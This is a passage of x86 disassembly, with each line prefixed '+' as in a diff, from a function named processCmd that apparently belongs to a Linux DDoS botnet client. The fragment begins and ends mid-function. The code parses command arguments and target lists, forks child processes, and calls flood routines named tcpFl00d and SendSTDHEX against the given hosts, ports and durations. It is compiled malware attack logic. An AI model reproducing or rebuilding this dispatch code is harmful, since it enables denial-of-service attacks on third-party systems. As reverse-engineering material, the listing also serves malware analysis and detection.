+ 804cb9e: 89 85 cc fe ff ff            	movl	%eax, -0x134(%ebp)
+ 804cba4: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cba7: 83 c0 0c                     	addl	$0xc, %eax
+ 804cbaa: 8b 00                        	movl	(%eax), %eax
+ 804cbac: 89 04 24                     	movl	%eax, (%esp)
+ 804cbaf: e8 28 68 00 00               	calll	0x80533dc <atol>
+ 804cbb4: 89 85 d0 fe ff ff            	movl	%eax, -0x130(%ebp)
+ 804cbba: c7 85 d4 fe ff ff 20 00 00 00	movl	$0x20, -0x12c(%ebp)
+ 804cbc4: c7 85 d8 fe ff ff 00 82 05 08	movl	$0x8058200, -0x128(%ebp) # imm = 0x8058200
+ 804cbce: c7 85 dc fe ff ff 0a 00 00 00	movl	$0xa, -0x124(%ebp)
+ 804cbd8: c7 85 e0 fe ff ff 00 00 00 00	movl	$0x0, -0x120(%ebp)
+ 804cbe2: 8b 85 c8 fe ff ff            	movl	-0x138(%ebp), %eax
+ 804cbe8: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804cbf0: 89 04 24                     	movl	%eax, (%esp)
+ 804cbf3: e8 68 49 00 00               	calll	0x8051560 <strchr>
+ 804cbf8: 85 c0                        	testl	%eax, %eax
+ 804cbfa: 0f 84 a6 00 00 00            	je	0x804cca6 <processCmd+0xeb8>
+ 804cc00: 8b 85 c8 fe ff ff            	movl	-0x138(%ebp), %eax
+ 804cc06: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804cc0e: 89 04 24                     	movl	%eax, (%esp)
+ 804cc11: e8 9e 4b 00 00               	calll	0x80517b4 <strtok>
+ 804cc16: 89 85 e4 fe ff ff            	movl	%eax, -0x11c(%ebp)
+ 804cc1c: eb 79                        	jmp	0x804cc97 <processCmd+0xea9>
+ 804cc1e: e8 32 cb ff ff               	calll	0x8049755 <listFork>
+ 804cc23: 85 c0                        	testl	%eax, %eax
+ 804cc25: 75 56                        	jne	0x804cc7d <processCmd+0xe8f>
+ 804cc27: 8b 85 dc fe ff ff            	movl	-0x124(%ebp), %eax
+ 804cc2d: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804cc31: 8b 85 e0 fe ff ff            	movl	-0x120(%ebp), %eax
+ 804cc37: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804cc3b: 8b 85 d8 fe ff ff            	movl	-0x128(%ebp), %eax
+ 804cc41: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804cc45: 8b 85 d4 fe ff ff            	movl	-0x12c(%ebp), %eax
+ 804cc4b: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804cc4f: 8b 85 d0 fe ff ff            	movl	-0x130(%ebp), %eax
+ 804cc55: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804cc59: 8b 85 cc fe ff ff            	movl	-0x134(%ebp), %eax
+ 804cc5f: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804cc63: 8b 85 e4 fe ff ff            	movl	-0x11c(%ebp), %eax
+ 804cc69: 89 04 24                     	movl	%eax, (%esp)
+ 804cc6c: e8 ac d2 ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804cc71: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804cc78: e8 b3 68 00 00               	calll	0x8053530 <exit>
+ 804cc7d: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804cc85: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804cc8c: e8 23 4b 00 00               	calll	0x80517b4 <strtok>
+ 804cc91: 89 85 e4 fe ff ff            	movl	%eax, -0x11c(%ebp)
+ 804cc97: 83 bd e4 fe ff ff 00         	cmpl	$0x0, -0x11c(%ebp)
+ 804cc9e: 0f 85 7a ff ff ff            	jne	0x804cc1e <processCmd+0xe30>
+ 804cca4: eb 63                        	jmp	0x804cd09 <processCmd+0xf1b>
+ 804cca6: e8 aa ca ff ff               	calll	0x8049755 <listFork>
+ 804ccab: 85 c0                        	testl	%eax, %eax
+ 804ccad: 0f 85 15 15 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804ccb3: 8b 85 dc fe ff ff            	movl	-0x124(%ebp), %eax
+ 804ccb9: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804ccbd: 8b 85 e0 fe ff ff            	movl	-0x120(%ebp), %eax
+ 804ccc3: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804ccc7: 8b 85 d8 fe ff ff            	movl	-0x128(%ebp), %eax
+ 804cccd: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804ccd1: 8b 85 d4 fe ff ff            	movl	-0x12c(%ebp), %eax
+ 804ccd7: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804ccdb: 8b 85 d0 fe ff ff            	movl	-0x130(%ebp), %eax
+ 804cce1: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804cce5: 8b 85 cc fe ff ff            	movl	-0x134(%ebp), %eax
+ 804cceb: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804ccef: 8b 85 c8 fe ff ff            	movl	-0x138(%ebp), %eax
+ 804ccf5: 89 04 24                     	movl	%eax, (%esp)
+ 804ccf8: e8 20 d2 ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804ccfd: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804cd04: e8 af 34 00 00               	calll	0x80501b8 <_exit>
+ 804cd09: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cd0c: 8b 00                        	movl	(%eax), %eax
+ 804cd0e: 89 85 94 fd ff ff            	movl	%eax, -0x26c(%ebp)
+ 804cd14: c7 85 90 fd ff ff 18 8e 05 08	movl	$0x8058e18, -0x270(%ebp) # imm = 0x8058E18
+ 804cd1e: c7 85 8c fd ff ff 04 00 00 00	movl	$0x4, -0x274(%ebp)
+ 804cd28: fc                           	cld
+ 804cd29: 8b b5 94 fd ff ff            	movl	-0x26c(%ebp), %esi
+ 804cd2f: 8b bd 90 fd ff ff            	movl	-0x270(%ebp), %edi
+ 804cd35: 8b 8d 8c fd ff ff            	movl	-0x274(%ebp), %ecx
+ 804cd3b: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804cd3d: 0f 97 c2                     	seta	%dl
+ 804cd40: 0f 92 c0                     	setb	%al
+ 804cd43: 88 d1                        	movb	%dl, %cl
+ 804cd45: 28 c1                        	subb	%al, %cl
+ 804cd47: 88 c8                        	movb	%cl, %al
+ 804cd49: 0f be c0                     	movsbl	%al, %eax
+ 804cd4c: 85 c0                        	testl	%eax, %eax
+ 804cd4e: 0f 85 44 01 00 00            	jne	0x804ce98 <processCmd+0x10aa>
+ 804cd54: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804cd58: 0f 8e 6a 14 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804cd5e: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cd61: 83 c0 08                     	addl	$0x8, %eax
+ 804cd64: 8b 00                        	movl	(%eax), %eax
+ 804cd66: 89 04 24                     	movl	%eax, (%esp)
+ 804cd69: e8 6e 66 00 00               	calll	0x80533dc <atol>
+ 804cd6e: 85 c0                        	testl	%eax, %eax
+ 804cd70: 0f 8e 52 14 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804cd76: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cd79: 83 c0 0c                     	addl	$0xc, %eax
+ 804cd7c: 8b 00                        	movl	(%eax), %eax
+ 804cd7e: 89 04 24                     	movl	%eax, (%esp)
+ 804cd81: e8 56 66 00 00               	calll	0x80533dc <atol>
+ 804cd86: 85 c0                        	testl	%eax, %eax
+ 804cd88: 7f 05                        	jg	0x804cd8f <processCmd+0xfa1>
+ 804cd8a: e9 39 14 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804cd8f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cd92: 83 c0 04                     	addl	$0x4, %eax
+ 804cd95: 8b 00                        	movl	(%eax), %eax
+ 804cd97: 89 85 e8 fe ff ff            	movl	%eax, -0x118(%ebp)
+ 804cd9d: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cda0: 83 c0 08                     	addl	$0x8, %eax
+ 804cda3: 8b 00                        	movl	(%eax), %eax
+ 804cda5: 89 04 24                     	movl	%eax, (%esp)
+ 804cda8: e8 2f 66 00 00               	calll	0x80533dc <atol>
+ 804cdad: 89 85 ec fe ff ff            	movl	%eax, -0x114(%ebp)
+ 804cdb3: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cdb6: 83 c0 0c                     	addl	$0xc, %eax
+ 804cdb9: 8b 00                        	movl	(%eax), %eax
+ 804cdbb: 89 04 24                     	movl	%eax, (%esp)
+ 804cdbe: e8 19 66 00 00               	calll	0x80533dc <atol>
+ 804cdc3: 89 85 f0 fe ff ff            	movl	%eax, -0x110(%ebp)
+ 804cdc9: 8b 85 e8 fe ff ff            	movl	-0x118(%ebp), %eax
+ 804cdcf: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804cdd7: 89 04 24                     	movl	%eax, (%esp)
+ 804cdda: e8 81 47 00 00               	calll	0x8051560 <strchr>
+ 804cddf: 85 c0                        	testl	%eax, %eax
+ 804cde1: 74 7a                        	je	0x804ce5d <processCmd+0x106f>
+ 804cde3: 8b 85 e8 fe ff ff            	movl	-0x118(%ebp), %eax
+ 804cde9: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804cdf1: 89 04 24                     	movl	%eax, (%esp)
+ 804cdf4: e8 bb 49 00 00               	calll	0x80517b4 <strtok>
+ 804cdf9: 89 85 f4 fe ff ff            	movl	%eax, -0x10c(%ebp)
+ 804cdff: eb 51                        	jmp	0x804ce52 <processCmd+0x1064>
+ 804ce01: e8 4f c9 ff ff               	calll	0x8049755 <listFork>
+ 804ce06: 85 c0                        	testl	%eax, %eax
+ 804ce08: 75 2e                        	jne	0x804ce38 <processCmd+0x104a>
+ 804ce0a: 8b 85 f0 fe ff ff            	movl	-0x110(%ebp), %eax
+ 804ce10: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804ce14: 8b 85 ec fe ff ff            	movl	-0x114(%ebp), %eax
+ 804ce1a: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804ce1e: 8b 85 f4 fe ff ff            	movl	-0x10c(%ebp), %eax
+ 804ce24: 89 04 24                     	movl	%eax, (%esp)
+ 804ce27: e8 0e dd ff ff               	calll	0x804ab3a <SendSTDHEX>
+ 804ce2c: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804ce33: e8 80 33 00 00               	calll	0x80501b8 <_exit>
+ 804ce38: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804ce40: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804ce47: e8 68 49 00 00               	calll	0x80517b4 <strtok>
+ 804ce4c: 89 85 f4 fe ff ff            	movl	%eax, -0x10c(%ebp)
+ 804ce52: 83 bd f4 fe ff ff 00         	cmpl	$0x0, -0x10c(%ebp)
+ 804ce59: 75 a6                        	jne	0x804ce01 <processCmd+0x1013>
+ 804ce5b: eb 3b                        	jmp	0x804ce98 <processCmd+0x10aa>
+ 804ce5d: e8 f3 c8 ff ff               	calll	0x8049755 <listFork>
+ 804ce62: 85 c0                        	testl	%eax, %eax
+ 804ce64: 0f 85 5e 13 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804ce6a: 8b 85 f0 fe ff ff            	movl	-0x110(%ebp), %eax
+ 804ce70: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804ce74: 8b 85 ec fe ff ff            	movl	-0x114(%ebp), %eax
+ 804ce7a: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804ce7e: 8b 85 e8 fe ff ff            	movl	-0x118(%ebp), %eax
+ 804ce84: 89 04 24                     	movl	%eax, (%esp)
+ 804ce87: e8 ae dc ff ff               	calll	0x804ab3a <SendSTDHEX>
+ 804ce8c: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804ce93: e8 20 33 00 00               	calll	0x80501b8 <_exit>
+ 804ce98: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804ce9b: 8b 00                        	movl	(%eax), %eax
+ 804ce9d: 89 85 88 fd ff ff            	movl	%eax, -0x278(%ebp)
+ 804cea3: c7 85 84 fd ff ff 1c 8e 05 08	movl	$0x8058e1c, -0x27c(%ebp) # imm = 0x8058E1C
+ 804cead: c7 85 80 fd ff ff 04 00 00 00	movl	$0x4, -0x280(%ebp)
+ 804ceb7: fc                           	cld
+ 804ceb8: 8b b5 88 fd ff ff            	movl	-0x278(%ebp), %esi
+ 804cebe: 8b bd 84 fd ff ff            	movl	-0x27c(%ebp), %edi
+ 804cec4: 8b 8d 80 fd ff ff            	movl	-0x280(%ebp), %ecx
+ 804ceca: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804cecc: 0f 97 c2                     	seta	%dl
+ 804cecf: 0f 92 c0                     	setb	%al
+ 804ced2: 88 d1                        	movb	%dl, %cl
+ 804ced4: 28 c1                        	subb	%al, %cl
+ 804ced6: 88 c8                        	movb	%cl, %al
+ 804ced8: 0f be c0                     	movsbl	%al, %eax
+ 804cedb: 85 c0                        	testl	%eax, %eax
+ 804cedd: 0f 85 af 01 00 00            	jne	0x804d092 <processCmd+0x12a4>
+ 804cee3: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804cee7: 0f 8e db 12 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804ceed: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cef0: 83 c0 0c                     	addl	$0xc, %eax
+ 804cef3: 8b 00                        	movl	(%eax), %eax
+ 804cef5: 89 04 24                     	movl	%eax, (%esp)
+ 804cef8: e8 df 64 00 00               	calll	0x80533dc <atol>
+ 804cefd: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804cf02: 7e 05                        	jle	0x804cf09 <processCmd+0x111b>
+ 804cf04: e9 bf 12 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804cf09: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cf0c: 83 c0 04                     	addl	$0x4, %eax
+ 804cf0f: 8b 00                        	movl	(%eax), %eax
+ 804cf11: 89 85 f8 fe ff ff            	movl	%eax, -0x108(%ebp)
+ 804cf17: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cf1a: 83 c0 08                     	addl	$0x8, %eax
+ 804cf1d: 8b 00                        	movl	(%eax), %eax
+ 804cf1f: 89 04 24                     	movl	%eax, (%esp)
+ 804cf22: e8 b5 64 00 00               	calll	0x80533dc <atol>
+ 804cf27: 89 85 fc fe ff ff            	movl	%eax, -0x104(%ebp)
+ 804cf2d: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cf30: 83 c0 0c                     	addl	$0xc, %eax
+ 804cf33: 8b 00                        	movl	(%eax), %eax
+ 804cf35: 89 04 24                     	movl	%eax, (%esp)
+ 804cf38: e8 9f 64 00 00               	calll	0x80533dc <atol>
+ 804cf3d: 89 85 00 ff ff ff            	movl	%eax, -0x100(%ebp)
+ 804cf43: c7 85 04 ff ff ff 20 00 00 00	movl	$0x20, -0xfc(%ebp)
+ 804cf4d: c7 85 08 ff ff ff 06 82 05 08	movl	$0x8058206, -0xf8(%ebp) # imm = 0x8058206
+ 804cf57: c7 85 0c ff ff ff 0a 00 00 00	movl	$0xa, -0xf4(%ebp)
+ 804cf61: c7 85 10 ff ff ff 00 00 00 00	movl	$0x0, -0xf0(%ebp)
+ 804cf6b: 8b 85 f8 fe ff ff            	movl	-0x108(%ebp), %eax
+ 804cf71: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804cf79: 89 04 24                     	movl	%eax, (%esp)
+ 804cf7c: e8 df 45 00 00               	calll	0x8051560 <strchr>
+ 804cf81: 85 c0                        	testl	%eax, %eax
+ 804cf83: 0f 84 a6 00 00 00            	je	0x804d02f <processCmd+0x1241>
+ 804cf89: 8b 85 f8 fe ff ff            	movl	-0x108(%ebp), %eax
+ 804cf8f: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804cf97: 89 04 24                     	movl	%eax, (%esp)
+ 804cf9a: e8 15 48 00 00               	calll	0x80517b4 <strtok>
+ 804cf9f: 89 85 14 ff ff ff            	movl	%eax, -0xec(%ebp)
+ 804cfa5: eb 79                        	jmp	0x804d020 <processCmd+0x1232>
+ 804cfa7: e8 a9 c7 ff ff               	calll	0x8049755 <listFork>
+ 804cfac: 85 c0                        	testl	%eax, %eax
+ 804cfae: 75 56                        	jne	0x804d006 <processCmd+0x1218>
+ 804cfb0: 8b 85 0c ff ff ff            	movl	-0xf4(%ebp), %eax
+ 804cfb6: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804cfba: 8b 85 10 ff ff ff            	movl	-0xf0(%ebp), %eax
+ 804cfc0: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804cfc4: 8b 85 08 ff ff ff            	movl	-0xf8(%ebp), %eax
+ 804cfca: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804cfce: 8b 85 04 ff ff ff            	movl	-0xfc(%ebp), %eax
+ 804cfd4: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804cfd8: 8b 85 00 ff ff ff            	movl	-0x100(%ebp), %eax
+ 804cfde: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804cfe2: 8b 85 fc fe ff ff            	movl	-0x104(%ebp), %eax
+ 804cfe8: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804cfec: 8b 85 14 ff ff ff            	movl	-0xec(%ebp), %eax
+ 804cff2: 89 04 24                     	movl	%eax, (%esp)
+ 804cff5: e8 23 cf ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804cffa: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d001: e8 2a 65 00 00               	calll	0x8053530 <exit>
+ 804d006: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d00e: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d015: e8 9a 47 00 00               	calll	0x80517b4 <strtok>
+ 804d01a: 89 85 14 ff ff ff            	movl	%eax, -0xec(%ebp)
+ 804d020: 83 bd 14 ff ff ff 00         	cmpl	$0x0, -0xec(%ebp)
+ 804d027: 0f 85 7a ff ff ff            	jne	0x804cfa7 <processCmd+0x11b9>
+ 804d02d: eb 63                        	jmp	0x804d092 <processCmd+0x12a4>
+ 804d02f: e8 21 c7 ff ff               	calll	0x8049755 <listFork>
+ 804d034: 85 c0                        	testl	%eax, %eax
+ 804d036: 0f 85 8c 11 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804d03c: 8b 85 0c ff ff ff            	movl	-0xf4(%ebp), %eax
+ 804d042: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804d046: 8b 85 10 ff ff ff            	movl	-0xf0(%ebp), %eax
+ 804d04c: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d050: 8b 85 08 ff ff ff            	movl	-0xf8(%ebp), %eax
+ 804d056: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d05a: 8b 85 04 ff ff ff            	movl	-0xfc(%ebp), %eax
+ 804d060: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d064: 8b 85 00 ff ff ff            	movl	-0x100(%ebp), %eax
+ 804d06a: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d06e: 8b 85 fc fe ff ff            	movl	-0x104(%ebp), %eax
+ 804d074: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d078: 8b 85 f8 fe ff ff            	movl	-0x108(%ebp), %eax
+ 804d07e: 89 04 24                     	movl	%eax, (%esp)
+ 804d081: e8 97 ce ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804d086: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d08d: e8 26 31 00 00               	calll	0x80501b8 <_exit>
+ 804d092: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d095: 8b 00                        	movl	(%eax), %eax
+ 804d097: 89 85 7c fd ff ff            	movl	%eax, -0x284(%ebp)
+ 804d09d: c7 85 78 fd ff ff 20 8e 05 08	movl	$0x8058e20, -0x288(%ebp) # imm = 0x8058E20
+ 804d0a7: c7 85 74 fd ff ff 04 00 00 00	movl	$0x4, -0x28c(%ebp)
+ 804d0b1: fc                           	cld
+ 804d0b2: 8b b5 7c fd ff ff            	movl	-0x284(%ebp), %esi
+ 804d0b8: 8b bd 78 fd ff ff            	movl	-0x288(%ebp), %edi
+ 804d0be: 8b 8d 74 fd ff ff            	movl	-0x28c(%ebp), %ecx
+ 804d0c4: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804d0c6: 0f 97 c2                     	seta	%dl
+ 804d0c9: 0f 92 c0                     	setb	%al
+ 804d0cc: 88 d1                        	movb	%dl, %cl
+ 804d0ce: 28 c1                        	subb	%al, %cl
+ 804d0d0: 88 c8                        	movb	%cl, %al
+ 804d0d2: 0f be c0                     	movsbl	%al, %eax
+ 804d0d5: 85 c0                        	testl	%eax, %eax
+ 804d0d7: 0f 85 af 01 00 00            	jne	0x804d28c <processCmd+0x149e>
+ 804d0dd: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804d0e1: 0f 8e e1 10 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d0e7: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d0ea: 83 c0 0c                     	addl	$0xc, %eax
+ 804d0ed: 8b 00                        	movl	(%eax), %eax
+ 804d0ef: 89 04 24                     	movl	%eax, (%esp)
+ 804d0f2: e8 e5 62 00 00               	calll	0x80533dc <atol>
+ 804d0f7: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804d0fc: 7e 05                        	jle	0x804d103 <processCmd+0x1315>
+ 804d0fe: e9 c5 10 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804d103: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d106: 83 c0 04                     	addl	$0x4, %eax
+ 804d109: 8b 00                        	movl	(%eax), %eax
+ 804d10b: 89 85 18 ff ff ff            	movl	%eax, -0xe8(%ebp)
+ 804d111: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d114: 83 c0 08                     	addl	$0x8, %eax
+ 804d117: 8b 00                        	movl	(%eax), %eax
+ 804d119: 89 04 24                     	movl	%eax, (%esp)
+ 804d11c: e8 bb 62 00 00               	calll	0x80533dc <atol>
+ 804d121: 89 85 1c ff ff ff            	movl	%eax, -0xe4(%ebp)
+ 804d127: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d12a: 83 c0 0c                     	addl	$0xc, %eax
+ 804d12d: 8b 00                        	movl	(%eax), %eax
+ 804d12f: 89 04 24                     	movl	%eax, (%esp)
+ 804d132: e8 a5 62 00 00               	calll	0x80533dc <atol>
+ 804d137: 89 85 20 ff ff ff            	movl	%eax, -0xe0(%ebp)
+ 804d13d: c7 85 24 ff ff ff 20 00 00 00	movl	$0x20, -0xdc(%ebp)
+ 804d147: c7 85 28 ff ff ff 12 82 05 08	movl	$0x8058212, -0xd8(%ebp) # imm = 0x8058212
+ 804d151: c7 85 2c ff ff ff 0a 00 00 00	movl	$0xa, -0xd4(%ebp)
+ 804d15b: c7 85 30 ff ff ff 00 00 00 00	movl	$0x0, -0xd0(%ebp)
+ 804d165: 8b 85 18 ff ff ff            	movl	-0xe8(%ebp), %eax
+ 804d16b: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804d173: 89 04 24                     	movl	%eax, (%esp)
+ 804d176: e8 e5 43 00 00               	calll	0x8051560 <strchr>
+ 804d17b: 85 c0                        	testl	%eax, %eax
+ 804d17d: 0f 84 a6 00 00 00            	je	0x804d229 <processCmd+0x143b>
+ 804d183: 8b 85 18 ff ff ff            	movl	-0xe8(%ebp), %eax
+ 804d189: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d191: 89 04 24                     	movl	%eax, (%esp)
+ 804d194: e8 1b 46 00 00               	calll	0x80517b4 <strtok>
+ 804d199: 89 85 34 ff ff ff            	movl	%eax, -0xcc(%ebp)
+ 804d19f: eb 79                        	jmp	0x804d21a <processCmd+0x142c>
+ 804d1a1: e8 af c5 ff ff               	calll	0x8049755 <listFork>
+ 804d1a6: 85 c0                        	testl	%eax, %eax
+ 804d1a8: 75 56                        	jne	0x804d200 <processCmd+0x1412>
+ 804d1aa: 8b 85 2c ff ff ff            	movl	-0xd4(%ebp), %eax
+ 804d1b0: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804d1b4: 8b 85 30 ff ff ff            	movl	-0xd0(%ebp), %eax
+ 804d1ba: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d1be: 8b 85 28 ff ff ff            	movl	-0xd8(%ebp), %eax
+ 804d1c4: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d1c8: 8b 85 24 ff ff ff            	movl	-0xdc(%ebp), %eax
+ 804d1ce: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d1d2: 8b 85 20 ff ff ff            	movl	-0xe0(%ebp), %eax
+ 804d1d8: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d1dc: 8b 85 1c ff ff ff            	movl	-0xe4(%ebp), %eax
+ 804d1e2: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d1e6: 8b 85 34 ff ff ff            	movl	-0xcc(%ebp), %eax
+ 804d1ec: 89 04 24                     	movl	%eax, (%esp)
+ 804d1ef: e8 29 cd ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804d1f4: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d1fb: e8 30 63 00 00               	calll	0x8053530 <exit>
+ 804d200: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804d208: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d20f: e8 a0 45 00 00               	calll	0x80517b4 <strtok>
+ 804d214: 89 85 34 ff ff ff            	movl	%eax, -0xcc(%ebp)
+ 804d21a: 83 bd 34 ff ff ff 00         	cmpl	$0x0, -0xcc(%ebp)
+ 804d221: 0f 85 7a ff ff ff            	jne	0x804d1a1 <processCmd+0x13b3>
+ 804d227: eb 63                        	jmp	0x804d28c <processCmd+0x149e>
+ 804d229: e8 27 c5 ff ff               	calll	0x8049755 <listFork>
+ 804d22e: 85 c0                        	testl	%eax, %eax
+ 804d230: 0f 85 92 0f 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804d236: 8b 85 2c ff ff ff            	movl	-0xd4(%ebp), %eax
+ 804d23c: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804d240: 8b 85 30 ff ff ff            	movl	-0xd0(%ebp), %eax
+ 804d246: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804d24a: 8b 85 28 ff ff ff            	movl	-0xd8(%ebp), %eax
+ 804d250: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804d254: 8b 85 24 ff ff ff            	movl	-0xdc(%ebp), %eax
+ 804d25a: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804d25e: 8b 85 20 ff ff ff            	movl	-0xe0(%ebp), %eax
+ 804d264: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804d268: 8b 85 1c ff ff ff            	movl	-0xe4(%ebp), %eax
+ 804d26e: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804d272: 8b 85 18 ff ff ff            	movl	-0xe8(%ebp), %eax
+ 804d278: 89 04 24                     	movl	%eax, (%esp)
+ 804d27b: e8 9d cc ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804d280: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804d287: e8 2c 2f 00 00               	calll	0x80501b8 <_exit>
+ 804d28c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d28f: 8b 00                        	movl	(%eax), %eax
+ 804d291: 89 85 70 fd ff ff            	movl	%eax, -0x290(%ebp)
+ 804d297: c7 85 6c fd ff ff 24 8e 05 08	movl	$0x8058e24, -0x294(%ebp) # imm = 0x8058E24
+ 804d2a1: c7 85 68 fd ff ff 06 00 00 00	movl	$0x6, -0x298(%ebp)
+ 804d2ab: fc                           	cld
+ 804d2ac: 8b b5 70 fd ff ff            	movl	-0x290(%ebp), %esi
+ 804d2b2: 8b bd 6c fd ff ff            	movl	-0x294(%ebp), %edi
+ 804d2b8: 8b 8d 68 fd ff ff            	movl	-0x298(%ebp), %ecx
+ 804d2be: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804d2c0: 0f 97 c2                     	seta	%dl
+ 804d2c3: 0f 92 c0                     	setb	%al
+ 804d2c6: 88 d1                        	movb	%dl, %cl
+ 804d2c8: 28 c1                        	subb	%al, %cl
+ 804d2ca: 88 c8                        	movb	%cl, %al
+ 804d2cc: 0f be c0                     	movsbl	%al, %eax
+ 804d2cf: 85 c0                        	testl	%eax, %eax
+ 804d2d1: 0f 85 ed 01 00 00            	jne	0x804d4c4 <processCmd+0x16d6>
